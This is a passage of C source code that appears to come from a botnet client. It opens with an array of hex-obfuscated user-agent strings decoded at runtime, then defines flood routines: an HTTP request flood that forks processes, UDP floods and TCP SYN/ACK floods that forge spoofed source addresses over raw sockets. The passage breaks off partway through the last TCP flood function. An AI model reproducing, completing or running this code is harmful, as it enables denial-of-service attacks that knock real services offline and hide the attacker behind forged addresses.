"\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x77\x19\xff\x61\xb9\x5a\x03\x34\xd9\xb0\x34\xeb\x50\x97\x50\x42\x34\x77\x19\xff\x2a\x6f\x42\x34\xc1\x2a\x6f\xd3\x34\xa4\xa0\xa0\x3c\x51\x77\x51\xd2\x4c\x19\x39\x27\xcf\xe2\x47\x97\xe2\x2a\x34\x1b\x4c\xc3\xb0\x62\x5c\xec\x34\x3c\x19\x78\x51\x34\xd7\x51\xce\x78\xb9\xd3\x34\xda\x65\xe7\xb9\xd4\x51\x27\x2a\xeb\x97\x50\x97\xe2\xeb\x2a\xe2\x97\xeb\x50\x50\x34\x46\x90\x75\x90\xe7\x19\x27\xcf\xe2\x47\x97\xe2\x2a", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x62\x90\xce\x19\xff\x39\xb9\x03\x65\x42\x34\x68\xff\x39\x51\x3c\x34\x62\x90\xce\x34\x09\x46\x34\x5e\x34\xeb\x50\xb4\xeb\xe2\xd3\x34\xa4\xa0\xa0\x3c\x51\x77\x51\xd2\x4c\x19\x39\x27\x2a\x50\x6f\x97\xeb\x97\xe2\x9a\x34\x1b\x4c\xc3\xb0\x62\x5c\xec\x34\x3c\x19\x78\x51\x34\xd7\x51\xce\x78\xb9\xd3\x34\x1c\x51\xe7\x03\x19\xb9\xff\x27\xeb\xeb\x97\x50\x34\x46\x90\x75\x90\xe7\x19\x27\x2a\x50\x6f\x97\xeb\x97\xe2\x9a", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x19\x1e\x65\xb9\xff\x51\x42\x34\xda\x1e\xbc\x34\x19\x1e\x65\xb9\xff\x51\x34\x09\x46\x34\x47\xb4\x50\x34\x3c\x19\x78\x51\x34\x62\x90\xce\x34\x09\x46\x34\x5e\xd3\x34\xa4\xa0\xa0\x3c\x51\x77\x51\xd2\x4c\x19\x39\x27\xcf\xe2\x47\x97\xcf\xeb\x97\xeb\x34\x1b\x4c\xc3\xb0\x62\x5c\xec\x34\x3c\x19\x78\x51\x34\xd7\x51\xce\x78\xb9\xd3\x34\x1c\x51\xe7\x03\x19\xb9\xff\x27\x47\x97\x50\x34\x62\xb9\xd2\x19\x3c\x51\x27\xeb\xeb\xa4\x6f\x2a\xcf\x34\x46\x90\x75\x90\xe7\x19\x27\xd0\xcf\xe2\x47\x97\xcf\xe2", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x77\x19\xff\x61\xb9\x5a\x03\x34\xd9\xb0\x34\x2a\x97\xeb\x42\x34\x77\x09\x77\x2a\x6f\x42\x34\xe7\xfc\xf1\xcf\x86\x97\x50\xd3\x34\xd7\x51\xce\x78\xb9\x27\x86\x50\xeb\x50\x50\xeb\x50\xeb\x34\x14\x19\xe7\x51\x75\xb9\xc1\x27\xcf\x86\x97\x50", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x5e\xeb\xeb\x42\x34\xda\xe7\x09\x46\x34\xc1\x9a\x2a\xb4\x2a\x6f\x34\xd0\xcf\xd0\x86\x97\xd0\x2a\x97\x50\xd3\x34\xa4\xa0\xa0\x3c\x51\x77\x51\xd2\x4c\x19\x39\x27\xcf\xe2\x47\x97\xe2\x2a\x34\x1b\x4c\xc3\xb0\x62\x5c\xec\x34\x3c\x19\x78\x51\x34\xd7\x51\xce\x78\xb9\xd3\x34\xda\x65\xe7\xb9\xd4\x51\x27\x2a\x50\x97\x50\x97\xe2\xeb\xeb\x86\x97\xeb\xeb\x6f\x34\x46\x90\x75\x90\xe7\x19\x27\xcf\xe2\x47\x97\xe2\x2a", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x5c\x19\xff\xe4\xc1\x42\x34\xa4\xff\x61\xe7\xb9\x19\x61\x34\x47\x97\x50\x42\x34\x46\xa4\x62\x46\xbc\xd9\xd7\x34\x46\x62\xdc\xd7\xd0\xe2\x50\x77\x9a\x34\x35\xe4\x19\x3c\x61\x27\xd9\x36\xcd\xd0\x50\x62\xd3\x34\xa4\xa0\xa0\x3c\x51\x77\x51\xd2\x4c\x19\x39\x27\xcf\xe2\x47\x97\xe2\x2a\x34\x1b\x4c\xc3\xb0\x62\x5c\xec\x34\x3c\x19\x78\x51\x34\xd7\x51\xce\x78\xb9\xd3\x34\x46\x90\xd4\x03\xe4\xff\xf9\x35\xe7\xb9\x5a\x03\x51\xe7\x27\xcf\x97\x6f\x34\xda\x65\xe7\xb9\xd4\x51\x27\xcf\xeb\x97\x50\x97\x86\x47\x50\x6f\x97\xeb\x50\x2a\x34\x62\xb9\xd2\x19\x3c\x51\x34\x46\x90\x75\x90\xe7\x19\x27\xcf\xe2\x47\x97\xe2\x2a", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x77\x19\xff\x61\xb9\x5a\x03\x34\xd9\xb0\x34\xeb\x50\x97\x50\x42\x34\x77\x19\xff\x2a\x6f\x42\x34\xc1\x2a\x6f\xd3\x34\xa4\xa0\xa0\x3c\x51\x77\x51\xd2\x4c\x19\x39\x27\xcf\xe2\x47\x97\xe2\x2a\x34\x1b\x4c\xc3\xb0\x62\x5c\xec\x34\x3c\x19\x78\x51\x34\xd7\x51\xce\x78\xb9\xd3\x34\xda\x65\xe7\xb9\xd4\x51\x27\x2a\x50\x97\x50\x97\xe2\xeb\xeb\x86\x97\xeb\xeb\xe2\x34\x46\x90\x75\x90\xe7\x19\x27\xcf\xe2\x47\x97\xe2\x2a", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x77\x19\xff\x61\xb9\x5a\x03\x34\x1e\x65\xb9\xff\x51\x34\xeb\x50\x97\x50\x42\x34\xa4\xff\x61\xe7\xb9\x19\x61\x34\x2a\x97\x50\x97\xeb\x42\x34\x62\x19\xce\xe7\xb9\x03\xb9\x75\x39\x42\x34\x5c\xe4\xd4\x19\x90\x34\xcf\xe2\xcf\xd3\x34\xa4\xa0\xa0\x3c\x51\x77\x51\xd2\x4c\x19\x39\x27\xcf\xe2\x47\x97\xe2\x2a\x34\x1b\x4c\xc3\xb0\x62\x5c\xec\x34\x3c\x19\x78\x51\x34\xd7\x51\xce\x78\xb9\xd3\x34\xda\x65\xe7\xb9\xd4\x51\x27\xcf\xeb\x97\x50\x97\x86\x47\x50\x6f\x97\x47\xd0\x34\x62\xb9\xd2\x19\x3c\x51\x34\x46\x90\x75\x90\xe7\x19\x27\xcf\xe2\x47\x97\xe2\x2a\x34\x9d\x61\xf9\x51\x27\xeb\x6f\x97\xeb\x6f\xe2\xd0\xe2", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x5c\x19\xff\xe4\xc1\x42\x34\xa4\xff\x61\xe7\xb9\x19\x61\x34\x6f\x97\x6f\x97\x6f\x42\x34\xc3\xb0\xda\x34\xcd\x51\x03\x19\xe7\x51\x34\x2a\x86\x50\x34\x35\xe4\x19\x3c\x61\x27\x4c\xb0\xbc\x9a\x6f\x1e\xd3\x34\xa4\xa0\xa0\x3c\x51\x77\x51\xd2\x4c\x19\x39\x27\xcf\xe2\x47\x97\xe2\x2a\x34\x1b\x4c\xc3\xb0\x62\x5c\xec\x34\x3c\x19\x78\x51\x34\xd7\x51\xce\x78\xb9\xd3\x34\x1c\x51\xe7\x03\x19\xb9\xff\x27\x6f\x97\x50\x34\xda\x65\xe7\xb9\xd4\x51\x27\xe2\xe2\x97\x50\x97\x50\x97\x50\x34\x62\xb9\xd2\x19\x3c\x51\x34\x46\x90\x75\x90\xe7\x19\x27\xcf\xe2\x47\x97\xe2\x2a", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x19\x1e\x65\xb9\xff\x51\x42\x34\xda\x1e\xbc\x34\x19\x1e\x65\xb9\xff\x51\x34\x09\x46\x34\xeb\x50\xb4\x86\xb4\xeb\x34\x3c\x19\x78\x51\x34\x62\x90\xce\x34\x09\x46\x34\x5e\xd3\x34\xa4\xa0\xa0\x3c\x51\x77\x51\xd2\x4c\x19\x39\x27\x2a\x50\x86\x97\x6f\x97\x2a\x34\x1b\x4c\xc3\xb0\x62\x5c\xec\x34\x3c\x19\x78\x51\x34\xd7\x51\xce\x78\xb9\xd3\x34\x62\xb9\xd2\x19\x3c\x51\x27\xeb\x6f\xcd\x86\x47", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x77\x19\xff\x61\xb9\x5a\x03\x34\xd9\xb0\x34\x2a\x97\xe2\x42\x34\x77\x19\xff\x2a\x6f\x42\x34\xc1\x2a\x6f\xd3\x34\xa4\xa0\xa0\x3c\x51\x77\x51\xd2\x4c\x19\x39\x27\xcf\xe2\x47\x97\xe2\x2a\x34\x1b\x4c\xc3\xb0\x62\x5c\xec\x34\x3c\x19\x78\x51\x34\xd7\x51\xce\x78\xb9\xd3\x34\xda\x65\xe7\xb9\xd4\x51\x27\x2a\x50\x97\x50\x97\xe2\xeb\xeb\x86\x97\xeb\xeb\xe2\x34\x46\x90\x75\x90\xe7\x19\x27\xcf\xe2\x47\x97\xe2\x2a", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x5c\x19\xff\xe4\xc1\x42\x34\xa4\xff\x61\xe7\xb9\x19\x61\x34\xcf\x97\x50\x42\x34\xc3\xbc\xa4\x77\x9d\x68\x34\xd7\x36\xa4\xdc\x5c\x50\xd0\x34\x35\xe4\x19\x3c\x61\x27\xc3\xbc\xa4\x77\x9d\x68\xd7\x36\xa4\xdc\x5c\x50\xd0\xd3\x34\xa4\xa0\xa0\x3c\x51\x77\x51\xd2\x4c\x19\x39\x27\xcf\xe2\x47\x97\xe2\x2a\x34\x1b\x4c\xc3\xb0\x62\x5c\xec\x34\x3c\x19\x78\x51\x34\xd7\x51\xce\x78\xb9\xd3\x34\x1c\x51\xe7\x03\x19\xb9\xff\x27\x6f\x97\x50\x34\xda\x65\xe7\xb9\xd4\x51\x27\xe2\x47\x97\x50\x97\x50\x97\x50\x34\x62\xb9\xd2\x19\x3c\x51\x34\x46\x90\x75\x90\xe7\x19\x27\xcf\xe2\x47\x97\xe2\x2a", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x77\x19\xff\x61\xb9\x5a\x03\x34\xd9\xb0\x34\xeb\x50\x97\x50\x42\x34\x77\x19\xff\x2a\x6f\x42\x34\xc1\x2a\x6f\xd3\x34\xa4\xa0\xa0\x3c\x51\x77\x51\xd2\x4c\x19\x39\x27\xcf\xe2\x47\x97\xe2\x2a\x34\x1b\x4c\xc3\xb0\x62\x5c\xec\x34\x3c\x19\x78\x51\x34\xd7\x51\xce\x78\xb9\xd3\x34\xda\x65\xe7\xb9\xd4\x51\x27\xcf\x2a\x97\x50\x97\x86\xd0\x86\x6f\x97\x9a\x47\x34\x46\x90\x75\x90\xe7\x19\x27\xcf\xe2\x47\x97\xe2\x2a", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x77\x19\xff\x61\xb9\x5a\x03\x34\xd9\xb0\x34\x2a\x97\xeb\x42\x34\x77\x19\xff\x2a\x6f\x42\x34\xc1\x2a\x6f\xd3\x34\xa4\xa0\xa0\x3c\x51\x77\x51\xd2\x4c\x19\x39\x27\xcf\xe2\x47\x97\xe2\x2a\x34\x1b\x4c\xc3\xb0\x62\x5c\xec\x34\x3c\x19\x78\x51\x34\xd7\x51\xce\x78\xb9\xd3\x34\xda\x65\xe7\xb9\xd4\x51\x27\x2a\xeb\x97\x50\x97\xe2\xeb\x2a\xe2\x97\xeb\x50\x50\x34\x46\x90\x75\x90\xe7\x19\x27\xcf\xe2\x47\x97\xe2\x2a", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x1b\x19\x1e\x90\x61\x42\x34\xbc\x42\x34\xda\x1e\xbc\x34\x19\x1e\x65\xb9\xff\x51\x34\x09\x46\x34\xe2\xb4\x86\x34\x3c\x19\x78\x51\x34\x62\x90\xce\x34\x09\x46\x34\x5e\x42\x34\x51\xff\xdc\xe4\x03\xd3\x34\xa4\xa0\xa0\x3c\x51\x77\x51\xd2\x4c\x19\x39\x27\xcf\xe2\xeb\x97\x86\xeb\x97\xeb\x50\x34\x1b\x4c\xc3\xb0\x62\x5c\xec\x34\x3c\x19\x78\x51\x34\xd7\x51\xce\x78\xb9\xd3\x34\x1c\x51\xe7\x03\x19\xb9\xff\x27\x6f\x97\x50\x97\x6f\x34\x62\xb9\xd2\x19\x3c\x51\x27\x47\x35\xe2\xeb\x6f\x34\x46\x90\x75\x90\xe7\x19\x27\xcf\xe2\xeb\x97\x86\xeb\x97\xeb\x50\xf9\x19\xff\xb4\x3c\x19\xd2\x97\xce\xce", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\xd7\x90\x3c\x51\xb9\xff\x27\xeb\x97\x86\x97\xd0\x34\x1b\x5e\xeb\xeb\x42\x34\x5c\x19\xff\xe4\xc1\x34\x19\x2a\x9a\x2a\x42\x34\xbc\x42\xd3\x34\xd7\x51\xce\x78\xb9\x27\x86\x50\x50\x86\xeb\x86\xeb\xe2\x34\xcd\x51\xd2\x19\x90\xff\x27\xeb\x97\x86\x97\xd0\xdc\x50\x97\xd2\xe4\xff\x78", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x46\x3c\x90\xce\x78\x5a\x90\xe7\x51\x27\xeb\xe2\x97\xe2\x47\x34\x1b\x5e\xeb\xeb\x42\x34\xbc\x42\x34\x5c\x19\xff\xe4\xc1\x34\xc1\x9a\x2a\xb4\x2a\x6f\x42\x34\x51\xff\xdc\xbc\x46\xd3\x34\xa4\xa0\xa0\x3c\x51\x77\x51\xd2\x4c\x19\x39\x27\xcf\xe2\xcf\x97\xeb\x34\x1b\x4c\xc3\xb0\x62\x5c\xec\x34\x3c\x19\x78\x51\x34\xd7\x51\xce\x78\xb9\xd3\x34\xda\x65\xe7\xb9\xd4\x51\x27\xeb\xe2\x97\x50\x97\x47\x9a\x86\x97\x6f\xeb", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\xce\xb9\xd4\xa0\x90\x39\x19\xd2\x3c\x51\x42\x34\x19\xda\x90\xd2\x34\xe2\x97\x50\x97\xe2\x42\x34\x62\x90\xce\x19\xff\x39\xb9\x03\x65\x42\x34\xbc\x42\x34\x1e\x1e\xda\x34\x62\x90\xce\x34\x09\x46\xd3", "\x09\xa0\x51\xe7\x90\x27\xd0\x97\x9a\x50\x34\x1b\xb3\x86\x62\x9d\x27\x62\x68\xcd\x1e\x42\x34\x09\xa0\x51\xe7\x90\x34\x62\x19\xff\x19\x27\xcf\x97\x50\x34\x1b\x77\x19\xff\x61\xb9\x5a\x03\x42\x34\xbc\x42\x34\x77\x19\xff\x61\xb9\x5a\x03\x34\xd9\xb0\x34\xcf\x97\xeb\x42\x34\x51\xff\xd3\x34\xa4\xa0\xa0\x3c\x51\x77\x51\xd2\x4c\x19\x39\x27\x9a\x9a\x2a\x42\x34\xbc\x42\x34\x51\xff\xd3\x34\x1e\xe7\x51\x03\x39\xb9\x27\x86\x97\x6f\x97\xeb\xcf\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x77\x19\xff\x61\xb9\x5a\x03\x34\xd9\xb0\x34\xeb\x50\x97\x50\x42\x34\x77\x09\x77\x2a\x6f\x42\x34\xe7\xfc\xf1\x6f\x9a\x97\x50\xd3\x34\xd7\x51\xce\x78\xb9\x27\x86\x50\xeb\x50\x50\xeb\x50\xeb\x34\x14\x19\xe7\x51\x75\xb9\xc1\x27\x6f\x9a\x97\x50", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x5e\xeb\xeb\x42\x34\xbc\x42\x34\x5c\x19\xff\xe4\xc1\x34\xa0\xa0\xce\x42\x34\x51\xff\xdc\xbc\x46\x42\x34\xe7\xfc\xf1\xeb\x97\xd0\x90\x9a\xd3\x34\xd7\x51\xce\x78\xb9\x27\x86\x50\x50\x47\xeb\x50\x50\x2a\x86\x50\x34\xd7\xe7\x90\xff\x1e\x90\xe7\x90\x61\x19\x03\xb9\x27\xe2\x97\xeb", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\xce\xb9\xd4\xa0\x90\x39\x19\xd2\x3c\x51\x42\x34\xbc\x42\x34\xa4\x35\xe7\xb9\x5a\x03\x51\x34\x50\x97\x2a\x42\x34\x46\x22\x3c\x3c\x90\xd2\x3c\x51\xd3\x34\xa4\xa0\xa0\x3c\x51\x77\x51\xd2\x4c\x19\x39\x27\x6f\x86\x50\xe9\x34\x1b\x4c\xc3\xb0\x62\x5c\xec\x34\x3c\x19\x78\x51\x34\xd7\x51\xce\x78\xb9\xd3", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x62\x90\xce\x19\xff\x39\xb9\x03\x65\x42\x34\xbc\x42\x34\x68\xff\x39\x51\x3c\x34\x62\x90\xce\x34\x09\x46\x34\x5e\x42\x34\x51\xff\x42\x34\xe7\xfc\xf1\xeb\x97\x9a\x97\xeb\x97\xeb\xeb\xd3\x34\xd7\x51\xce\x78\xb9\x27\x86\x50\x50\x47\xeb\xeb\x86\x9a\x34\xda\x90\xd4\x19\xff\xb9\x27\xeb\x97\xcf\x97\x6f", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x77\x19\xff\x61\xb9\x5a\x03\x42\x34\xbc\x42\x34\x77\x19\xff\x61\xb9\x5a\x03\x34\xd9\xb0\x34\x2a\x97\xeb\x42\x34\xe7\xfc\xf1\x86\x97\x86\xd3\x34\xd7\x51\xce\x78\xb9\x27\x86\x50\xeb\xeb\x50\x86\x50\xeb", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x5e\xeb\xeb\x42\x34\xbc\x42\x34\x5c\x19\xff\xe4\xc1\x34\x19\x2a\x9a\x2a\x42\x34\xa0\x3c\xdc\x1e\x5c\x42\x34\xe7\xfc\xf1\xeb\x97\xd0\x97\x50\x97\x2a\xd3\x34\xd7\x51\xce\x78\xb9\x27\x86\x50\x50\xd0\x50\x86\x50\xd0\xeb\xeb", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x77\x19\xff\x61\xb9\x5a\x03\x42\x34\xbc\x42\x34\x77\x19\xff\x61\xb9\x5a\x03\x34\xd9\xb0\x34\x2a\x97\xeb\x42\x34\xce\x03\x42\x34\xe7\xfc\xf1\xeb\x97\xd0\x97\x86\x97\x2a\xd3\x34\xd7\x51\xce\x78\xb9\x27\x86\x50\xeb\x50\x50\x2a\x86\x9a\x34\xd4\x22\x19\xd2\xe7\xb9\x5a\x27\x6f\x90\x3c\xa0\x65\x90\x86", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\x6f\x97\x50\x34\x1b\xce\xb9\xd4\xa0\x90\x39\x19\xd2\x3c\x51\x42\x34\x62\x46\x68\x9d\x34\x47\x97\x50\x42\x34\x77\x19\xff\x61\xb9\x5a\x03\x34\xd9\xb0\x34\x2a\x97\x50\x42\x34\x62\x22\x68\x9d\x86\x42\x34\x46\x5c\xda\xda\xeb\x42\x34\x97\xd9\x9d\xb0\x34\xda\x5c\x36\x34\x86\x97\x50\x97\xcf\x50\x47\x86\x47\x42\x34\x62\x51\x61\x19\x90\x34\xda\x51\xff\x39\x51\xe7\x34\x1e\xda\x34\xcf\x97\x50\xd3", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x77\x19\xff\x61\xb9\x5a\x03\x42\x34\xbc\x42\x34\x77\x19\xff\x34\xd0\xc1\x34\x6f\x97\xd0\x50\x42\x34\x46\xd7\x42\x34\xe7\xfc\xf1\xeb\x97\xd0\x97\x86\x97\x6f\xd3\x34\xd7\x51\xce\x78\xb9\x27\x86\x50\xeb\x50\xeb\xeb\x50\x6f\x34\xd9\x51\x39\x03\xce\x90\xa0\x51\x27\xd0\x97\xeb\x97\x50\x86\x9a\xcf", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x5e\xeb\xeb\x42\x34\xbc\x42\x34\x5c\x19\xff\xe4\xc1\x34\x19\x2a\x9a\x2a\x42\x34\x51\xff\xdc\xbc\x46\x42\x34\xe7\xfc\xf1\xeb\x97\xd0\x97\x50\x97\x9a\xd3\x34\xd7\x51\xce\x78\xb9\x27\x86\x50\x50\xd0\x50\xe2\x86\x47\x34\xd7\x90\x3c\x51\xb9\xff\x27\x86\x97\x50\x97\x47", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x1e\x5c\xa4\x80\x46\xb0\xa4\xb0\x68\x09\xd9\x34\xe2\x42\x34\xe2\x97\xcf\xcf\xd3", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x5e\xeb\xeb\x42\x34\x5c\x19\xff\xe4\xc1\x34\xc1\x9a\x2a\xb4\x2a\x6f\x42\x34\xe7\xfc\xf1\xe2\x9a\x97\x50\xd3\x34\xd7\x51\xce\x78\xb9\x27\x86\x50\xeb\x50\x50\xeb\x50\xeb\x34\xb0\x65\xe4\xff\x61\x51\xe7\xd2\x19\xe7\x61\x27\xe2\x9a\x97\x86\x97\x50\x34\x5c\x19\xf9\x65\x39\xff\x19\xff\xf9\x27\x6f\x97\x50\x97\x86", "\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x77\x19\xff\x61\xb9\x5a\x03\x34\xd9\xb0\x34\x2a\x97\xeb\x42\x34\x77\x09\x77\x2a\x6f\xd3\x34\x46\x78\x22\xa0\x51\xbc\xe7\x19\x1e\xe7\x51\xfc\x19\x51\x5a\x34\x1e\xe7\x51\xfc\x19\x51\x5a\x27\x50\x97\xcf"
};

void sendHTTP(char * method, char * host, uint16_t port, char * path, int timeFoo, int power) {
    const char * connections[] = {
        "close",
        "keep-alive",
        "accept"
    };
    int i, timeEnd = time(NULL) + timeFoo;
    char request[2048];
    sprintf(request, "%s %s HTTP/1.1\r\nConnection: %s\r\n%s: %s\r\n\r\n", method, path, connections[(rand() % 3)], eika("\xbc\x03\x51\xe7\xdc\xa4\xf9\x51\xff\x39"), eika(useragents[rand() % NUMITEMS(useragents)]));
    for (i = 0; i < power; i++) {
        if (fork()) {
            while (timeEnd > time(NULL)) {
                int sock = socket_connect((char * ) host, port);
                if (sock != 0) {
                    write(sock, request, strlen(request));
                    close(sock);
                }
            }
           _exit(1);
        }
    }
}
uint32_t LOCAL_ADDR;

void sendUDP(unsigned char * target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
  struct sockaddr_in dest_addr;

  dest_addr.sin_family = AF_INET;
  if (port == 0) dest_addr.sin_port = rand_cmwc();
  else dest_addr.sin_port = HTONS(port);
  if (getHost(target, & dest_addr.sin_addr)) return;
  memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

  register unsigned int pollRegister;
  pollRegister = pollinterval;

  if (spoofit == 32) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (!sockfd) {
      return;
    }

    unsigned char * buf = (unsigned char * ) malloc(packetsize + 1);
    if (buf == NULL) return;
    memset(buf, 0, packetsize + 1);
    RandBytes(buf, packetsize);

    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    register unsigned int ii = 0;
    while (1) {
      sendto(sockfd, buf, packetsize, 0, (struct sockaddr * ) & dest_addr, sizeof(dest_addr));

      if (i == pollRegister) {
        if (port == 0) dest_addr.sin_port = rand_cmwc();
        if (time(NULL) > end) break;
        i = 0;
        continue;
      }
      i++;
      if (ii == sleepcheck) {
        usleep(sleeptime * 1000);
        ii = 0;
        continue;
      }
      ii++;
    }
  } else {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (!sockfd) {
      return;
    }

    int tmp = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, & tmp, sizeof(tmp)) < 0) {
      return;
    }

    int counter = 50;
    while (counter--) {
        srand(time(NULL) ^ rand_cmwc() ^ getpid());
        init_rand(time(NULL) ^ rand_cmwc() ^ getpid());
    }

    in_addr_t netmask;

    if (spoofit == 0) netmask = (~((in_addr_t) - 1));
    else netmask = (~((1 << (32 - spoofit)) - 1));

    unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
    struct iphdr * iph = (struct iphdr *) packet;
    struct udphdr * udph = (void * ) iph + sizeof(struct iphdr);

    makeIPPacket(iph, dest_addr.sin_addr.s_addr, HTONL(GetRandomIP(netmask)), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);

    udph->len = HTONS(sizeof(struct udphdr) + packetsize);
    udph->source = rand_cmwc();
    udph->dest = (port == 0 ? rand_cmwc() : HTONS(port));
    udph->check = 0;

    RandString((unsigned char * )(((unsigned char * ) udph) + sizeof(struct udphdr)), packetsize);

    iph->check = csum((unsigned short * ) packet, iph->tot_len);

    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    register unsigned int ii = 0;
    while (1) {

      udph->source = rand_cmwc();
      udph->dest = (port == 0 ? rand_cmwc() : HTONS(port));
      iph->id = rand_cmwc();
      iph->saddr = HTONL(GetRandomIP(netmask));
      iph->check = csum((unsigned short * ) packet, iph->tot_len);

      if (i == pollRegister) {
        if (time(NULL) > end) break;
        i = 0;
        continue;
      }
      i++;

      if (ii == sleepcheck) {
        usleep(sleeptime * 1000);
        ii = 0;
        continue;
      }
      ii++;
    }
  }
}



void ovtcp(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
{
        register unsigned int pollRegister;
        pollRegister = pollinterval;

        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = HTONS(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd)
        {
                return;
        }

        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
        {
                return;
        }

        in_addr_t netmask;

        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, HTONL( GetRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;

        if(!strcmp(flags, okic("7~~")))
        {
                tcph->syn = 1;
                tcph->rst = 1;
                tcph->fin = 1;
                tcph->ack = 1;
                tcph->psh = 1;
  } else {
    unsigned char * pch = strtok(flags, "-");
    while (pch) {
      if (!strcmp(pch, okic("6p,"))) {
        tcph->syn = 1;
      } else if (!strcmp(pch, okic("v6c"))) {
        tcph->rst = 1;
      } else if (!strcmp(pch, okic("dx,"))) {
        tcph->fin = 1;
      } else if (!strcmp(pch, okic("7DU"))) {
        tcph->ack = 1;
      } else if (!strcmp(pch, okic("|6e"))) {
        tcph->psh = 1;
      } else {
       return;
      }
      pch = strtok(NULL, ",");
    }
  }


        tcph->window = rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : HTONS(port));
        tcph->check = tcpcsum(iph, tcph);

        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
		
        register unsigned int i = 0;
		int sleepdep = (rand() % 2500000) + 500000;
        while(1)
        {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                iph->saddr = HTONL( GetRandomIP(netmask) );
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                if(i == pollRegister)
                {
                        if(time(NULL) > end) break;
                        i = 0;
                        continue;
                }
                i++;
				usleep(sleepdep);
			    if(sleepdep<=0) continue;
				else
					sleepdep=sleepdep-250000;
        }
}

void ftcp(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
{
        register unsigned int pollRegister;
        pollRegister = pollinterval;

        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = HTONS(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd)
        {
                return;
        }

        int tmp = 1;
